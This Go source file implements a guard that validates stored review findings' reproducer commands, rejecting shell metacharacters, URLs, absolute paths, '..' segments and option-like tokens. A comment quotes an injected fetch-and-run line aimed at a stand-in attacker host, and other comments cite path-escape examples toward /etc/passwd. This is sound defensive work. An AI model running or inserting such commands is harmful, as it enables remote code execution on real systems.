package guard

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"path/filepath"
	"strings"
)

// checkPanelReproducers is scripts/check-panel-reproducers.sh: that script's
// header comment is the contract -- exit 0 every finding the store returned
// has exactly one well-formed reproducer, 1 violations (each on stderr), 2
// cannot answer. The findings read is Env.Findings when set, else `flow
// record findings`. The reasoning for each branch, moved here from the bash
// body it replaced (3e48ecac), sits beside the code it explains.
//
// The banned-character set is single-sourced with run-reproducer's own copy
// of the same check -- metachars.go's reproducerMetachars, pinned to
// scripts/reproducer-metachars.sh by TestMetacharsMatchBashSource -- see
// scripts/reproducer-metachars.sh's header for why: this set has already
// drifted between the two scripts twice. The bash guard sourced that file at
// run time and refused at exit 2 when it was unreadable, rather than run
// with nothing banned; the set is compiled in here, so there is no file left
// to find missing.
func init() {
	Registry["check-panel-reproducers"] = checkPanelReproducers
}

const (
	cprPrefix   = "check-panel-reproducers: "
	cprJQFailed = cprPrefix + "jq failed — cannot determine anything"
	cprExempt   = "none — "
)

func checkPanelReproducers(args []string, env Env, stdout, stderr io.Writer) int {
	arg := func(i int) string {
		if i < len(args) {
			return args[i]
		}
		return ""
	}
	worktreeArg, name := arg(0), arg(1)
	abs := func(p string) string {
		if !filepath.IsAbs(p) {
			p = filepath.Join(env.Dir, p)
		}
		return filepath.Clean(p)
	}
	if worktreeArg == "" || !isDir(abs(worktreeArg)) {
		shown := worktreeArg
		if shown == "" {
			shown = "<missing>"
		}
		fmt.Fprintf(stderr, "%snot a directory: %s\n", cprPrefix, shown)
		return 2
	}
	if name == "" {
		fmt.Fprintln(stderr, "usage: check-panel-reproducers.sh <worktree> <change-name>")
		return 2
	}

	// CONTAINMENT. The change name arrives from a pull-request-editable state file and is
	// passed to `flow record findings -change`, so the same hazards apply
	// here: `../../../planted` names a change outside any sane scope, and a
	// glob metacharacter has no business in a plain change name either.
	//
	// THE CHECK IS plainChangeName (cleanupcomplete.go), whose comment is
	// canonical for the reasoning and for the measurement behind enumerating
	// the characters rather than writing them as ranges. plainChangeName
	// compares bytes, as the bash's `export LC_ALL=C` made its enumeration do.
	if !plainChangeName(name) {
		fmt.Fprintf(stderr, "%schange name '%s' is not a plain change name — it must start with a letter or digit and contain only letters, digits, '.', '_' and '-'\n", cprPrefix, name)
		return 2
	}
	// Canonicalised to an absolute path before it is ever passed to `flow`
	// as `-C`. A worktree argument that is a RELATIVE path beginning with `-`
	// (`scripts/check-panel-reproducers.sh -dashy`, run from the directory
	// that contains it) would otherwise make `-C`'s value look like a flag to
	// `flow`'s own argument parser; an absolute path is rooted at `/`, which
	// closes that hazard. EvalSymlinks (the bash's `cd ... && pwd -P`)
	// resolves symlinks, matching run-reproducer's own canonicalisation of
	// the same variable (runreproducer.go): on a symlinked worktree a logical
	// path and the runner's later, physical resolution of the same worktree
	// would disagree about what counts as "inside" it.
	//
	// The worktree is guarded a second time here, distinct from the
	// existence check above: the two are separate syscalls, and a worktree
	// that vanishes in the gap between them (a concurrent cleanup, a race
	// with another /flow integrate or archive run) fails here after the
	// directory check already passed -- reported at this guard's own exit 2.
	worktree, err := filepath.EvalSymlinks(abs(worktreeArg))
	if err != nil {
		fmt.Fprintf(stderr, "%sworktree vanished before it could be resolved: %s\n", cprPrefix, worktreeArg)
		return 2
	}

	// THE STATE RECORD IS THE CHANGE'S BOOTSTRAP (KAN-658). The store
	// addresses records by project and change name together, and the project
	// key resolves from the worktree argument -- so on a cross-repo change
	// only the canonical worktree resolves the record at all, and a peer
	// worktree's findings read below would answer `[]` at exit 0: a clean
	// REPRODUCERS-OK on a change this invocation never actually saw. The
	// record is read FIRST for exactly that reason, and this block is
	// DUPLICATED, on purpose, in panelexitcontract.go, whose store read has
	// the same blind spot; TestCheckPanelReproducers and
	// TestCheckPanelReproducerExitContract assert the same refused shapes,
	// which is what keeps the copies from drifting. `flow state get`
	// reached-and-absent exits 1 -- a fact about this project/change pair, and
	// on a cross-repo change the signature of a guard invoked on a peer tree
	// -- reported at this guard's own exit 2, never a clean answer.
	// Store-unreachable exits 0 with the fallback record only when one
	// exists, so an empty or non-JSON stdout at exit 0 is the same
	// cannot-answer class the findings read below already gives an
	// unreachable store. This guard resolves nothing per finding from the
	// record's `worktrees` map -- every check below is deliberately lexical
	// and never touches the filesystem -- so the record's presence and
	// readability are all it takes from it.
	//
	// The CLI's own stderr rides along in the refusal, so a missing `flow`
	// binary or a dead daemon is reported with its evidence instead of being
	// flattened into the cross-repo prose (panel finding F3, kan-658 round 0).
	stateOut, stateErr, stateRC := pcFlow(env, false, "state", "get", "-C", worktree, name)
	flowSaid := ""
	if s := strings.ReplaceAll(string(stateErr), "\n", " "); s != "" {
		flowSaid = " — flow said: " + s
	}
	if stateRC != 0 {
		if stateRC == 126 || stateRC == 127 {
			// The CLI never ran -- reporting the store fact would be a guess
			// wearing evidence's clothes (panel finding F3, kan-658 round 0).
			fmt.Fprintf(stderr, "%scannot run the flow CLI (exit %d%s) — cannot determine anything\n", cprPrefix, stateRC, flowSaid)
		} else {
			fmt.Fprintf(stderr, "%sthe store has no record of change '%s' under this worktree's project (flow exit %d%s) — a cross-repo change's guards answer only through its canonical worktree\n", cprPrefix, name, stateRC, flowSaid)
		}
		return 2
	}
	var state map[string]json.RawMessage
	if json.Unmarshal(bytes.TrimRight(stateOut, "\n"), &state) != nil || state == nil {
		fmt.Fprintf(stderr, "%scannot read the state record for '%s' — cannot determine anything%s\n", cprPrefix, name, flowSaid)
		return 2
	}

	// THE STORE IS QUERIED ONCE, and a failed `flow record findings` is this
	// guard's own exit 2 -- "cannot determine anything" -- never exit 1's
	// "violations found" and never exit 0's "clean". `flow record findings`
	// itself never journals and never falls back to "no findings" for a store
	// it could not reach (see its own doc comment in stats/cmd/flow/record.go):
	// a change the store has genuinely never heard of prints `[]` at exit 0,
	// and only a real connection failure reaches this branch.
	var findingsJSON []byte
	if env.Findings != nil {
		findingsJSON, err = env.Findings(name)
	} else {
		var rc int
		findingsJSON, _, rc = pcFlow(env, true, "record", "findings", "-change", name, "-C", worktree)
		if rc != 0 {
			err = fmt.Errorf("flow exit %d", rc)
		}
	}
	findingsText := strings.TrimRight(string(findingsJSON), "\n")
	if err != nil {
		fmt.Fprintf(stderr, "%scannot read findings for '%s' from the store — cannot determine anything: %s\n", cprPrefix, name, findingsText)
		return 2
	}
	findings, ok := pcParseFindings([]byte(findingsText))
	if !ok {
		fmt.Fprintln(stderr, cprJQFailed)
		return 2
	}
	severities, ok := cprSeverities([]byte(findingsText))
	if !ok {
		fmt.Fprintln(stderr, cprJQFailed)
		return 2
	}

	// A FINDING WITH A NULL OR EMPTY REPRODUCER IS ITS OWN "CANNOT ANSWER"
	// REFUSAL, exit 2, even though write-time validation should make this
	// shape unreachable in practice: a finding is only ever written with a
	// well-formed reproducer or the `none — <reason>` exemption already in
	// place. "cannot answer at all" outranks a false REPRODUCERS-OK, so this
	// guard refuses rather than assumes the impossibility holds.
	var empty []string
	for _, f := range findings {
		if f.noRepro {
			empty = append(empty, f.refText)
		}
	}
	if len(empty) > 0 {
		fmt.Fprintf(stderr, "%sfinding(s) %s carry no reproducer field at all — cannot determine anything\n", cprPrefix, strings.Join(empty, " "))
		return 2
	}
	// A finding whose ref is not a JSON string -- absent, null, a number --
	// is refused at exit 2 as malformed findings output. The bash body's
	// per-ref `select(.ref == $ref)` never matched such a finding, so its
	// reproducer went unchecked while it still counted toward REPRODUCERS-OK;
	// the store always writes a string ref (decided 2026-09-27, kan-778's
	// task 3 Correction).
	for _, f := range findings {
		if f.ref == nil {
			fmt.Fprintln(stderr, cprJQFailed)
			return 2
		}
	}

	// Every finding carries its status and its reproducer together in one
	// JSON object, so there is no second block whose identifiers could
	// disagree with the first the way the old finding-status/
	// finding-reproducer marker blocks could. `findings_ref_key` is a store
	// uniqueness constraint (design.md's `store-side-findings` decision), so
	// the refs are already unique -- no duplicate-identifier check is needed
	// here; a ref's reproducer and severity are still read as the bash's
	// `select(.ref == $ref)` read them, every match's value one line each.
	var violations []string
	add := func(v string) { violations = append(violations, v) }
	for _, f := range findings {
		ref := f.refText
		var repros, sevs []string
		for i, g := range findings {
			if g.ref != nil && *g.ref == ref {
				repros = append(repros, g.reproducer)
				sevs = append(sevs, severities[i])
			}
		}
		// `$(...)` dropped the trailing newlines of both reads.
		reproducer := strings.TrimRight(strings.Join(repros, "\n"), "\n")
		severity := strings.TrimRight(strings.Join(sevs, "\n"), "\n")

		// A WELL-FORMED REPRODUCER CARRIES EITHER A COMMAND TOKEN, OR THE
		// LITERAL EXEMPTION `none — <reason>` WITH NON-SPACE TEXT AFTER THE EM
		// DASH -- the exemption only ever legal on a finding whose severity is
		// not Important, checked at the exemption branch below. A bare `none`
		// with no reason is refused -- `finding-reproducer: F1 none` used to
		// reach REPRODUCERS-OK with nothing said about why no check runs. A
		// reproducer whose text is the whole word `none` (followed by
		// whitespace or end of string, so a command that merely starts with
		// those four letters, such as `nonexistent-script`, is never counted:
		// it is followed by a letter, not a word boundary) must go on to carry
		// ` — ` and a reason.
		exemption := strings.HasPrefix(reproducer, cprExempt) && len(reproducer) > len(cprExempt) &&
			!cprSpace(reproducer[len(cprExempt)])
		if strings.HasPrefix(reproducer, "none") && (len(reproducer) == 4 || cprSpace(reproducer[4])) && !exemption {
			add(ref + ": declare 'none' with no reason — the exemption form is 'none — <reason>', not a bare 'none'")
			continue
		}
		if exemption {
			// THE EXEMPTION IS AVAILABLE TO MINOR FINDINGS ONLY (KAN-503): an
			// Important-severity finding must carry a runnable command.
			// Severity is free text in the store, matched case-insensitively
			// and exactly the way stats/internal/store/aggregate.go's
			// `severity ILIKE 'important'` rows match it -- a longer free-text
			// severity is read into no rule here, the same reading the
			// aggregate applies, and a finding carrying no severity at all
			// (`null`) matches nothing. EqualFold equals the bash's C-locale
			// `tr '[:upper:]' '[:lower:]'` here: no non-ASCII rune folds to a
			// letter of "important".
			if strings.EqualFold(severity, "important") {
				add(ref + ": Important-severity finding carries the 'none — <reason>' exemption — a runnable reproducer is required at Important")
			}
			continue
		}
		violations = append(violations, cprCommandViolations(ref, reproducer)...)
	}

	if len(violations) > 0 {
		for _, v := range violations {
			fmt.Fprintf(stderr, "%s%s\n", cprPrefix, v)
		}
		return 1
	}
	// Every finding carries a non-empty reproducer by now (the refusal above),
	// so the bash's second count of them is the array's length.
	fmt.Fprintf(stdout, "REPRODUCERS-OK (%d finding(s) declared)\n", len(findings))
	return 0
}

// cprCommandViolations checks a runnable reproducer's shape.
//
// A RUNNABLE REPRODUCER'S COMMAND MUST BE A BARE PATH SHAPE, never a shell
// command line. /flow's implement phase runs a passing reproducer as a
// direct exec, with an argument vector, never through a shell (see
// skills/flow/review-panel.md) -- but the store's reproducer field is
// subagent-authored text, exactly the kind of attacker-influenceable input
// this repository already treats a Jira summary or a `## standards` entry
// as, and nothing short of this guard stops a value such as
// `scripts/x.sh; curl http://evil.example/x | sh` from reaching
// REPRODUCERS-OK. Checked here, at read time, rather than only in the
// runner's own prose constraint, so a malformed value is caught before it is
// ever a candidate to run.
//
// The check is deliberately separate rules rather than one broad pattern, so
// a violation names the shape it broke:
//   - no shell metacharacter anywhere in the text (reproducerMetachars) -- a
//     direct exec never expands any of these, so their presence only ever
//     means the author expected a shell to see them. `\` is in the set for the
//     same reason: a trailing backslash is a shell line-continuation, which
//     has no meaning to a direct exec either.
//   - no leading `-` on the PATH TOKEN (the text up to its first space) --
//     bound to the path token alone, not to every token, so an ordinary
//     `script.sh --strict` is untouched; a path token starting with `-` looks
//     like an option to whatever runs it, never a file
//   - no URL scheme anywhere in the text (`://`) -- a reproducer names a path
//     inside the worktree, never a network location
//   - no ABSOLUTE token and no `..` PATH SEGMENT, on the path token or on any
//     argument after it. Checked LEXICALLY, on the text of the value, and
//     never against the filesystem: the store may be read in contexts where
//     the worktree that wrote a finding is not the one this guard runs
//     against, so there is nothing on disk this guard could safely resolve a
//     path against. That means this rejects only the shapes that CANNOT be
//     contained inside ANY worktree -- an absolute path such as `/etc/passwd`
//     names a location outside every worktree by construction, and a `..`
//     segment such as `../../../etc/passwd` walks out of one. A relative
//     path with no `..` segment (`foo..bar.sh` is not one) still needs
//     resolving against a real worktree to know whether it stays inside --
//     that is skills/flow/review-panel.md's own dispatch-time containment
//     check, not this one.
//
// This never checks that the path exists on disk, for the same reason:
// existence is the caller's check at dispatch time, not this finding's shape.
func cprCommandViolations(ref, cmd string) []string {
	var v []string
	pathToken, _, _ := strings.Cut(cmd, " ")
	if strings.HasPrefix(pathToken, "-") {
		v = append(v, fmt.Sprintf("%s's reproducer command begins with a leading '-' on its path token ('%s') — a runnable reproducer names a path, never an option", ref, pathToken))
	}
	if strings.Contains(cmd, "://") {
		v = append(v, ref+"'s reproducer command names a URL — a runnable reproducer is a bare path inside the worktree, never a network location")
	}
	// The bash's `IFS=$' \t' read -ra`: the first line only, split on space
	// and tab.
	firstLine, _, _ := strings.Cut(cmd, "\n")
	for _, tok := range strings.FieldsFunc(firstLine, func(r rune) bool { return r == ' ' || r == '\t' }) {
		if strings.HasPrefix(tok, "/") {
			v = append(v, fmt.Sprintf("%s's reproducer command carries an absolute token ('%s') — a runnable reproducer names a path relative to the worktree, never an absolute path, on the path token or any argument", ref, tok))
		}
		if hasDotDotSegment(tok) {
			v = append(v, fmt.Sprintf("%s's reproducer command carries a '..' path segment ('%s') — a runnable reproducer must stay inside the worktree, on the path token or any argument", ref, tok))
		}
	}
	if strings.ContainsAny(cmd, reproducerMetachars) {
		v = append(v, ref+"'s reproducer command carries a shell metacharacter — a runnable reproducer is a bare path optionally followed by plain arguments, never a shell command line")
	}
	return v
}

// cprSeverities is each finding's `jq -r .severity`, index-aligned with
// pcParseFindings' result.
func cprSeverities(b []byte) ([]string, bool) {
	var raw []map[string]json.RawMessage
	if json.Unmarshal(b, &raw) != nil {
		return nil, false
	}
	out := make([]string, len(raw))
	for i, o := range raw {
		out[i] = pcRaw(o["severity"])
	}
	return out, true
}

// cprSpace is the C locale's [[:space:]].
func cprSpace(c byte) bool {
	return strings.IndexByte(" \t\n\v\f\r", c) >= 0
}
